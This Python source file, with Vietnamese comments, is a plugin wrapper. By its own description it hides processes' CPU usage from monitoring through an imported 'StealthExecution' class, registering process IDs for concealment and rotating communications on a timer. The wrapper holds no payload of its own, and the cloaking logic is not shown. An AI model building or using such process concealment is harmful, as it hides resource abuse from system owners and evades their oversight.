"""cpu_plugins.cloaking.stealth_plugin

Plugin che giấu CPU sử dụng StealthExecution.
"""
from __future__ import annotations

import logging
from typing import Dict, Any, Optional

from ..core import ICpuTechnique, register_plugin
from .stealth_exec import StealthExecution


@register_plugin("stealth_execution")
class StealthExecutionPlugin(ICpuTechnique):
    """Plugin che giấu CPU sử dụng StealthExecution."""
    
    name = "stealth_execution"
    priority = 10
    
    def __init__(self):
        """Khởi tạo plugin."""
        self.logger = logging.getLogger(__name__)
        self.stealth_executor: Optional[StealthExecution] = None
        self.engine = None
        self.config = {}
    
    def init(self, engine: Any, config: Optional[Dict[str, Any]] = None) -> bool:
        """Khởi tạo plugin với engine và cấu hình."""
        self.engine = engine
        self.config = config or {}
        
        try:
            rotation_interval = self.config.get("comm_rotation_interval", 30)
            self.stealth_executor = StealthExecution(
                logger=self.logger,
                comm_rotation_interval=rotation_interval
            )
            
            # Bắt đầu che giấu ngay lập tức nếu được cấu hình
            if self.config.get("start_immediately", False):
                self.stealth_executor.start()
                
            self.logger.info("Stealth execution plugin initialized")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize stealth execution plugin: {e}")
            return False
    
    def apply(self, pid: int) -> bool:
        """Áp dụng che giấu cho một PID cụ thể."""
        if not self.stealth_executor:
            self.logger.warning("Stealth executor not initialized")
            return False
        
        # Đảm bảo stealth executor đang chạy
        if not getattr(self.stealth_executor, "_running", False):
            self.stealth_executor.start()
        
        # Thêm PID vào danh sách theo dõi
        return self.stealth_executor.add_process(pid)
    
    def stop(self) -> bool:
        """Dừng plugin và giải phóng tài nguyên."""
        if self.stealth_executor:
            self.stealth_executor.stop()
            self.stealth_executor = None
            
        self.logger.info("Stealth execution plugin stopped")
        return True 